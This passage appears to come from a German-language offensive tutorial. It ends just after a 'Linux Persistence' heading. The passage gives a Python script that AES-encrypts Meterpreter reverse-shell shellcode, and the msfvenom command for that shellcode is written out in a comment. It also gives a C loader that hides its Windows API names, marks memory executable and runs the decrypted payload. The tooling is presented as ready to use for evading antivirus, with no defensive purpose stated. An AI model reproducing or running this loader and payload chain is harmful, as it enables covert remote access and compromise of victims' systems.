#!/usr/bin/env python3
# Generiert einen C-Loader mit AES-verschluesseltem Shellcode
import os, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Shellcode: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o sc.bin
shellcode = open('sc.bin', 'rb').read()
key, iv   = os.urandom(16), os.urandom(16)
ct        = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(shellcode, 16))

def arr(name, data):
    return f"unsigned char {name}[] = {{{','.join(hex(b) for b in data)}}};\n"

print(arr('key', key) + arr('iv', iv) + arr('enc', ct))
print(f"// Laenge: {len(ct)} Bytes")
```

C-Loader (Runtime-Entschluesselung + Direct-Syscall):
```c
// Minimaler Loader ohne verdaechtige Windows-API-Strings
#include <windows.h>

// XOR-Obfuskierung der API-Namen:
char va[]   = {0x56,0x69,0x72,0x74,0x75,0x61,0x6c,0x41,0x6c,0x6c,0x6f,0x63,0};  // "VirtualAlloc"
char vp[]   = {0x56,0x69,0x72,0x74,0x75,0x61,0x6c,0x50,0x72,0x6f,0x74,0x65,0x63,0x74,0};
typedef LPVOID(WINAPI*pVA)(LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL(WINAPI*pVP)(LPVOID,SIZE_T,DWORD,PDWORD);

void run(unsigned char*sc, int len) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    pVA  va_fn = (pVA)GetProcAddress(k32, va);
    pVP  vp_fn = (pVP)GetProcAddress(k32, vp);
    DWORD old;
    LPVOID mem = va_fn(NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    memcpy(mem, sc, len);
    vp_fn(mem, len, PAGE_EXECUTE_READ, &old);
    ((void(*)())mem)();
}
```

Linux Persistence:
```bash
# 1. Systemd (ueberlebt Reboots)
